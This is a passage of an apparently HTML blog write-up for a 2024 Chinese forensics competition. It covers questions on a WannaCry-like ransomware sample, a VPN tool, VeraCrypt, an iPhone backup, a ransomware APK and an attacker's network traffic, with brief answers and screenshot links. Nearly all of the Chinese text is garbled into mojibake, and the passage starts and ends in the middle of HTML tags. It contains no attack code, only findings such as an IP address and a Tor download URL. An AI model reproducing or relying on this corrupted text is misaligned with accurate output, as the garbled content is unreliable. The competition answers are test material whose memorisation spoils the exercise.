æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ-èº«ä»½è¯ä¸ç”„åˆ«çœŸå‡-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="3.åˆ†æè®¡ç®—æœºæ£€æï¼Œå¯¹è§£å¯†åçš„èº«ä»½è¯æ•°æ®åˆ—è¿›è¡Œå•åˆ—å»é‡æ“ä½œï¼Œé‡å¤çš„èº«ä»½è¯å·ç æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ(èº«ä»½è¯ä¸ç”„åˆ«çœŸå‡)(æ ‡å‡†æ ¼å¼ï¼š100)"></a>3.åˆ†æè®¡ç®—æœºæ£€æï¼Œå¯¹è§£å¯†åçš„èº«ä»½è¯æ•°æ®åˆ—è¿›è¡Œå•åˆ—å»é‡æ“ä½œï¼Œé‡å¤çš„èº«ä»½è¯å·ç æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ(èº«ä»½è¯ä¸ç”„åˆ«çœŸå‡)(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="4-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ ¹æ®èº«ä»½è¯å·ç ï¼ˆç¬¬17ä½ï¼‰åˆ†ææ€§åˆ«ï¼Œç”·æ€§çš„æ•°æ®æ˜¯å¤šå°‘æ¡ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#4-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ ¹æ®èº«ä»½è¯å·ç ï¼ˆç¬¬17ä½ï¼‰åˆ†ææ€§åˆ«ï¼Œç”·æ€§çš„æ•°æ®æ˜¯å¤šå°‘æ¡ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="4.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ ¹æ®èº«ä»½è¯å·ç ï¼ˆç¬¬17ä½ï¼‰åˆ†ææ€§åˆ«ï¼Œç”·æ€§çš„æ•°æ®æ˜¯å¤šå°‘æ¡ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)"></a>4.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ ¹æ®èº«ä»½è¯å·ç ï¼ˆç¬¬17ä½ï¼‰åˆ†ææ€§åˆ«ï¼Œç”·æ€§çš„æ•°æ®æ˜¯å¤šå°‘æ¡ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="5-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œå¯¹è§£å¯†åçš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œç”„åˆ«èº«ä»½è¯å·ç æ€§åˆ«å€¼ä¸æ ‡è¯†æ€§åˆ«ä¸ä¸€è‡´çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#5-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œå¯¹è§£å¯†åçš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œç”„åˆ«èº«ä»½è¯å·ç æ€§åˆ«å€¼ä¸æ ‡è¯†æ€§åˆ«ä¸ä¸€è‡´çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="5.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œå¯¹è§£å¯†åçš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œç”„åˆ«èº«ä»½è¯å·ç æ€§åˆ«å€¼ä¸æ ‡è¯†æ€§åˆ«ä¸ä¸€è‡´çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)"></a>5.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œå¯¹è§£å¯†åçš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œç”„åˆ«èº«ä»½è¯å·ç æ€§åˆ«å€¼ä¸æ ‡è¯†æ€§åˆ«ä¸ä¸€è‡´çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="6-åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€å·¥å…·ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1-1"><a href="#6-åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€å·¥å…·ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1-1" class="headerlink" title="6.åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€å·¥å…·ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1.1)"></a>6.åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€å·¥å…·ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1.1)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-225948225.png" class="">  <img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-230013994.png" class="">  <p>4.4</p><h2 id="7-åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€èŠ‚ç‚¹è®¢é˜…åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttp-xxx-xx-x-xxx"><a href="#7-åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€èŠ‚ç‚¹è®¢é˜…åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttp-xxx-xx-x-xxx" class="headerlink" title="7.åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€èŠ‚ç‚¹è®¢é˜…åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šhttp://xxx.xx/x/xxx)"></a>7.åˆ†æè®¡ç®—æœºæ£€æï¼Œè®¡ç®—æœºä¸­å­˜åœ¨çš„â€œVPNâ€èŠ‚ç‚¹è®¢é˜…åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š<a href="http://xxx.xx/x/xxx">http://xxx.xx/x/xxx</a>)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-230347474.png" class="">  <h2 id="8-åˆ†æè®¡ç®—æœºæ£€æï¼Œeduwcryå‹ç¼©åŒ…æ–‡ä»¶çš„è§£å‹å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabcabc"><a href="#8-åˆ†æè®¡ç®—æœºæ£€æï¼Œeduwcryå‹ç¼©åŒ…æ–‡ä»¶çš„è§£å‹å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabcabc" class="headerlink" title="8.åˆ†æè®¡ç®—æœºæ£€æï¼Œeduwcryå‹ç¼©åŒ…æ–‡ä»¶çš„è§£å‹å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabcabc)"></a>8.åˆ†æè®¡ç®—æœºæ£€æï¼Œeduwcryå‹ç¼©åŒ…æ–‡ä»¶çš„è§£å‹å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabcabc)</h2><p>yasuomimaå¯†ç ç®¡ç†é‡Œæœ‰å¯†ç <br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-231457642.png" class="">  </p><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-231437359.png" class="">  <p>æœç‹—è¯åº“é‡Œä¹Ÿæœ‰</p><h2 id="9-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºé‡Šæ”¾å‹ç¼©åŒ…çš„md5å€¼æ˜¯å¤šå°‘ã€‚-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™"><a href="#9-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºé‡Šæ”¾å‹ç¼©åŒ…çš„md5å€¼æ˜¯å¤šå°‘ã€‚-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™" class="headerlink" title="9.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºé‡Šæ”¾å‹ç¼©åŒ…çš„md5å€¼æ˜¯å¤šå°‘ã€‚(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)"></a>9.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºé‡Šæ”¾å‹ç¼©åŒ…çš„md5å€¼æ˜¯å¤šå°‘ã€‚(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)</h2><p>é€šè¿‡pestudioå¯ä»¥æŸ¥çœ‹è¿™ä¸ªç—…æ¯’ä¼šé‡Šæ”¾ä¸€ä¸ªå‹ç¼©åŒ…<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-232901719.png" class=""><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-232838843.png" class=""><br>å¯¼å‡ºåæŸ¥çœ‹md5</p><h2 id="10-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè®°å½•çš„æ´‹è‘±æµè§ˆå™¨ä¸‹è½½åœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttp-xxx-xxx-xxx-xxx-zip"><a href="#10-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè®°å½•çš„æ´‹è‘±æµè§ˆå™¨ä¸‹è½½åœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šhttp-xxx-xxx-xxx-xxx-zip" class="headerlink" title="10.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè®°å½•çš„æ´‹è‘±æµè§ˆå™¨ä¸‹è½½åœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šhttp://xxx.xxx/xxx/xxx.zip)"></a>10.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè®°å½•çš„æ´‹è‘±æµè§ˆå™¨ä¸‹è½½åœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š<a href="http://xxx.xxx/xxx/xxx.zip">http://xxx.xxx/xxx/xxx.zip</a>)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-203524347.png" class="">  <p>ä¸¢ä¸ªvscodeè¿›å»,åœ¨ç—…æ¯’æ–‡ä»¶å¤¹æœç´¢<a href="https://å³å¯">https://å³å¯</a><br><a href="https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip">https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip</a></p><h2 id="11-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè§£å¯†äº†t-wnryåè¯¥dllçš„md5å€¼æ˜¯å¤šå°‘ã€‚-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™"><a href="#11-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè§£å¯†äº†t-wnryåè¯¥dllçš„md5å€¼æ˜¯å¤šå°‘ã€‚-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™" class="headerlink" title="11.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè§£å¯†äº†t.wnryåè¯¥dllçš„md5å€¼æ˜¯å¤šå°‘ã€‚(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)"></a>11.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®æ¶æ„ç¨‹åºè§£å¯†äº†t.wnryåè¯¥dllçš„md5å€¼æ˜¯å¤šå°‘ã€‚(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)</h2><p>è¦é€†å‘åŠ¨è°ƒâ€¦.</p><h2 id="12-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºè¿è¡Œèµ·æ¥åç¬¬ä¸€ä¸ªå¾ªç¯è°ƒç”¨äº†å‡ æ¬¡taskkill-exeã€‚-æ ‡å‡†æ ¼å¼ï¼š2"><a href="#12-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºè¿è¡Œèµ·æ¥åç¬¬ä¸€ä¸ªå¾ªç¯è°ƒç”¨äº†å‡ æ¬¡taskkill-exeã€‚-æ ‡å‡†æ ¼å¼ï¼š2" class="headerlink" title="12.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºè¿è¡Œèµ·æ¥åç¬¬ä¸€ä¸ªå¾ªç¯è°ƒç”¨äº†å‡ æ¬¡taskkill.exeã€‚(æ ‡å‡†æ ¼å¼ï¼š2)"></a>12.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºè¿è¡Œèµ·æ¥åç¬¬ä¸€ä¸ªå¾ªç¯è°ƒç”¨äº†å‡ æ¬¡taskkill.exeã€‚(æ ‡å‡†æ ¼å¼ï¼š2)</h2><h2 id="13-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®-WanaDecryptor-exe-lnkæ–‡ä»¶æ˜¯é€šè¿‡ä»€ä¹ˆå‡½æ•°åˆ›å»ºçš„ã€‚-æ ‡å‡†æ ¼å¼ï¼šAabcdef"><a href="#13-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®-WanaDecryptor-exe-lnkæ–‡ä»¶æ˜¯é€šè¿‡ä»€ä¹ˆå‡½æ•°åˆ›å»ºçš„ã€‚-æ ‡å‡†æ ¼å¼ï¼šAabcdef" class="headerlink" title="13.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®@WanaDecryptor@.exe.lnkæ–‡ä»¶æ˜¯é€šè¿‡ä»€ä¹ˆå‡½æ•°åˆ›å»ºçš„ã€‚(æ ‡å‡†æ ¼å¼ï¼šAabcdef)"></a>13.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®@WanaDecryptor@.exe.lnkæ–‡ä»¶æ˜¯é€šè¿‡ä»€ä¹ˆå‡½æ•°åˆ›å»ºçš„ã€‚(æ ‡å‡†æ ¼å¼ï¼šAabcdef)</h2><h2 id="14-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºä¿®æ”¹ç³»ç»Ÿæ¡Œé¢å£çº¸æ˜¯åœ¨å“ªä¸ªå‡½æ•°å®ç°çš„-æ ‡å‡†æ ¼å¼ï¼šsub-xxx"><a href="#14-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºä¿®æ”¹ç³»ç»Ÿæ¡Œé¢å£çº¸æ˜¯åœ¨å“ªä¸ªå‡½æ•°å®ç°çš„-æ ‡å‡†æ ¼å¼ï¼šsub-xxx" class="headerlink" title="14.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºä¿®æ”¹ç³»ç»Ÿæ¡Œé¢å£çº¸æ˜¯åœ¨å“ªä¸ªå‡½æ•°å®ç°çš„(æ ‡å‡†æ ¼å¼ï¼šsub_xxx)"></a>14.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºä¿®æ”¹ç³»ç»Ÿæ¡Œé¢å£çº¸æ˜¯åœ¨å“ªä¸ªå‡½æ•°å®ç°çš„(æ ‡å‡†æ ¼å¼ï¼šsub_xxx)</h2><h2 id="15-åˆ†æè®¡ç®—æœºæ£€æï¼ŒVeraCryptåŠ å¯†å®¹å™¨çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabc"><a href="#15-åˆ†æè®¡ç®—æœºæ£€æï¼ŒVeraCryptåŠ å¯†å®¹å™¨çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabc" class="headerlink" title="15.åˆ†æè®¡ç®—æœºæ£€æï¼ŒVeraCryptåŠ å¯†å®¹å™¨çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabc)"></a>15.åˆ†æè®¡ç®—æœºæ£€æï¼ŒVeraCryptåŠ å¯†å®¹å™¨çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabc)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205809455.png" class="">  <img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205827505.png" class="">  <img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205836337.png" class="">  <p>è§£å‹eç›˜çš„ddæ–‡ä»¶</p><h2 id="16-åˆ†æè®¡ç®—æœºæ£€æï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªè‹¹æœæ‰‹æœºå¤‡ä»½åŒ…ï¼Œæ‰‹æœºå¤‡ä»½åŒ…çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š12345"><a href="#16-åˆ†æè®¡ç®—æœºæ£€æï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªè‹¹æœæ‰‹æœºå¤‡ä»½åŒ…ï¼Œæ‰‹æœºå¤‡ä»½åŒ…çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š12345" class="headerlink" title="16.åˆ†æè®¡ç®—æœºæ£€æï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªè‹¹æœæ‰‹æœºå¤‡ä»½åŒ…ï¼Œæ‰‹æœºå¤‡ä»½åŒ…çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š12345)"></a>16.åˆ†æè®¡ç®—æœºæ£€æï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªè‹¹æœæ‰‹æœºå¤‡ä»½åŒ…ï¼Œæ‰‹æœºå¤‡ä»½åŒ…çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š12345)</h2><h2 id="17-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å®é™…ç¯¡æ”¹å¤šå°‘æ¡å¾®ä¿¡æ•°æ®ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1"><a href="#17-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å®é™…ç¯¡æ”¹å¤šå°‘æ¡å¾®ä¿¡æ•°æ®ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1" class="headerlink" title="17.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å®é™…ç¯¡æ”¹å¤šå°‘æ¡å¾®ä¿¡æ•°æ®ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1)"></a>17.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å®é™…ç¯¡æ”¹å¤šå°‘æ¡å¾®ä¿¡æ•°æ®ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1)</h2><h2 id="18-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å…±å­˜æ¬¾äº†å¤šå°‘é‡‘é¢ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š10ä¸‡"><a href="#18-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å…±å­˜æ¬¾äº†å¤šå°‘é‡‘é¢ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š10ä¸‡" class="headerlink" title="18.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å…±å­˜æ¬¾äº†å¤šå°‘é‡‘é¢ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š10ä¸‡)"></a>18.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œæœºä¸»å…±å­˜æ¬¾äº†å¤šå°‘é‡‘é¢ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š10ä¸‡)</h2><h2 id="19-åˆ†æè®¡ç®—æœºæ£€æï¼Œåœ¨æ‰‹æœºæ¨¡æ‹Ÿå™¨ä¸­å‹’ç´¢apkè½¯ä»¶çš„sha256å€¼æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™"><a href="#19-åˆ†æè®¡ç®—æœºæ£€æï¼Œåœ¨æ‰‹æœºæ¨¡æ‹Ÿå™¨ä¸­å‹’ç´¢apkè½¯ä»¶çš„sha256å€¼æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™" class="headerlink" title="19.åˆ†æè®¡ç®—æœºæ£€æï¼Œåœ¨æ‰‹æœºæ¨¡æ‹Ÿå™¨ä¸­å‹’ç´¢apkè½¯ä»¶çš„sha256å€¼æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)"></a>19.åˆ†æè®¡ç®—æœºæ£€æï¼Œåœ¨æ‰‹æœºæ¨¡æ‹Ÿå™¨ä¸­å‹’ç´¢apkè½¯ä»¶çš„sha256å€¼æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå…¨å°å†™)</h2><h2 id="20-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®å‹’ç´¢apkè½¯ä»¶çš„è§£é”å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šqwer-com"><a href="#20-åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®å‹’ç´¢apkè½¯ä»¶çš„è§£é”å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šqwer-com" class="headerlink" title="20.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®å‹’ç´¢apkè½¯ä»¶çš„è§£é”å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šqwer.com)"></a>20.åˆ†æè®¡ç®—æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·é—®å‹’ç´¢apkè½¯ä»¶çš„è§£é”å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šqwer.com)</h2><h1 id="æµé‡å–è¯"><a href="#æµé‡å–è¯" class="headerlink" title="æµé‡å–è¯"></a>æµé‡å–è¯</h1><h2 id="1-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºç®¡ç†å‘˜å¯¹webç¯å¢ƒè¿›è¡Œç®¡ç†çš„å·¥å…·åã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°çš®ï¼‰"><a href="#1-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºç®¡ç†å‘˜å¯¹webç¯å¢ƒè¿›è¡Œç®¡ç†çš„å·¥å…·åã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°çš®ï¼‰" class="headerlink" title="1.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºç®¡ç†å‘˜å¯¹webç¯å¢ƒè¿›è¡Œç®¡ç†çš„å·¥å…·åã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°çš®ï¼‰"></a>1.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºç®¡ç†å‘˜å¯¹webç¯å¢ƒè¿›è¡Œç®¡ç†çš„å·¥å…·åã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°çš®ï¼‰</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-164631039.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰åƒcheck.bt.cnå‘é€dnsè¯·æ±‚å³å…¶ä¸ºå®å¡”</p><h2 id="2-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çš„ipåœ°å€æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127-0-0-1ï¼‰"><a href="#2-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çš„ipåœ°å€æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127-0-0-1ï¼‰" class="headerlink" title="2.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çš„ipåœ°å€æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127.0.0.1ï¼‰"></a>2.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çš„ipåœ°å€æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127.0.0.1ï¼‰</h2><p>192.168.209.135<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-142507715.png" class="">  </p><h2 id="3-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çˆ†ç ´å‡ºçš„ç½‘ç«™éç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šadminï¼‰"><a href="#3-åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çˆ†ç ´å‡ºçš„ç½‘ç«™éç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šadminï¼‰" class="headerlink" title="3.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çˆ†ç ´å‡ºçš„ç½‘ç«™éç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šadminï¼‰"></a>3.åˆ†ææµé‡åŒ…æ£€æï¼Œç»™å‡ºæ”»å‡»è€…çˆ†ç ´å‡ºçš„ç½‘ç«™éç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šadminï¼‰</h2><h2 id="4-åˆ†ææµé‡åŒ…æ£€æï¼Œæ”»å‡»è€…è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°çš„å…·æœ‰åé—¨çš„é¡µé¢urlè·¯å¾„ä¸ºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-abc-htmlï¼‰"><a 